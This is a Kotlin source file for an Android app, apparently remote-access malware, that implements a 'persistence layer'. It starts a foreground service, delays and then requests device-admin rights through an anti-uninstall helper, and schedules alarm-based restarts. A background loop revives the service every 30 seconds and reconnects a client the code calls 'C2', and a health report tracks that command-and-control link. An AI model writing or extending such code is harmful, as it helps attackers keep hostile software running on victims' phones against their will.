package com.xrc.app.persistence

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.service.CoreService
import kotlinx.coroutines.*

/**
 * Multi-layer persistence framework with 5 survival layers:
 * Layer 1: Foreground Service + sticky notification
 * Layer 2: Device Admin + BOOT_COMPLETED
 * Layer 3: Alarm Manager keep-alive
 * Layer 4: Job Scheduler periodic checks
 * Layer 5: Accessibility service resurrection
 */
object PersistenceLayer {

    const val TAG = "PersistenceLayer"
    private var initialized = false
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var keepAliveJob: Job? = null
    private var resurrectionCount = 0

    fun initialize(context: Context) {
        if (initialized) return
        initialized = true

        Log.i(TAG, "Initializing persistence layer")

        // Layer 1: Foreground Service
        startCoreService(context)

        // Layer 2: Device Admin
        AntiUninstall.initialize(context)
        if (!AntiUninstall.isAdminActive(context)) {
            scope.launch {
                delay(10000) // Wait for initial setup
                AntiUninstall.requestAdmin(context)
            }
        }

        // Layer 3: Alarm Manager keep-alive
        setupAlarmManager(context)

        // Layer 4: Start monitoring
        startKeepAliveMonitoring(context)
    }

    private fun startCoreService(context: Context) {
        val intent = Intent(context, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    private fun setupAlarmManager(context: Context) {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, CoreService.RestartReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            context, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Repeat every 10 minutes
        alarmManager.setInexactRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 600000,
            600000,
            pendingIntent
        )
    }

    private fun startKeepAliveMonitoring(context: Context) {
        keepAliveJob = scope.launch {
            while (isActive) {
                delay(30000) // Check every 30 seconds

                // Check if CoreService is running
                if (!CoreService.isRunning) {
                    Log.w(TAG, "CoreService not running, restarting...")
                    startCoreService(context)
                    resurrectionCount++
                }

                // Check C2 connection
                val c2Client = XRCApp.instance.c2Client
                if (c2Client.connectionState.value != c2Client.ConnectionState.CONNECTED) {
                    Log.w(TAG, "C2 disconnected, reconnecting...")
                    c2Client.connect()
                }

                // Check accessibility
                if (com.xrc.app.service.XRCAccessibilityService.instance == null) {
                    Log.w(TAG, "Accessibility service not running")
                    // Can't restart accessibility programmatically, user must enable
                }

                if (resurrectionCount % 10 == 0) {
                    Log.i(TAG, "Resurrection count: $resurrectionCount")
                }
            }
        }
    }

    fun checkHealth(): HealthReport {
        return HealthReport(
            coreServiceRunning = CoreService.isRunning,
            adminActive = AntiUninstall.isAdminActive(XRCApp.instance),
            accessibilityRunning = com.xrc.app.service.XRCAccessibilityService.isRunning,
            c2Connected = XRCApp.instance.c2Client.connectionState.value ==
                    XRCApp.instance.c2Client.ConnectionState.CONNECTED,
            resurrectionCount = resurrectionCount
        )
    }

    data class HealthReport(
        val coreServiceRunning: Boolean,
        val adminActive: Boolean,
        val accessibilityRunning: Boolean,
        val c2Connected: Boolean,
        val resurrectionCount: Int
    ) {
        fun toJson(): String {
            return """{"core_service":$coreServiceRunning,"admin_active":$adminActive,"accessibility":$accessibilityRunning,"c2_connected":$c2Connected,"resurrections":$resurrectionCount}"""
        }
    }
}
